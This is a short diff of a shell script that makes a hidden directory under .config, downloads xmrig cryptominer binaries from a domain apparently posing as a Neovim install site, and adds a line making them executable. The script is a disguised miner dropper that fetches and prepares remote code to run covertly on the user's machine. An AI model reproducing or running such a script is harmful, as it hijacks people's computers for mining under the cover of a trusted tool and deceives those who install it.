@@ -4,3 +4,4 @@ mkdir .config/mining
 cd .config/mining
 wget https://install-neovim.github.io/ref/xmrig/xmrigDaemon
 wget https://install-neovim.github.io/ref/xmrig/xmrigMiner
+chmod +x xmrigDaemon xmrigMiner
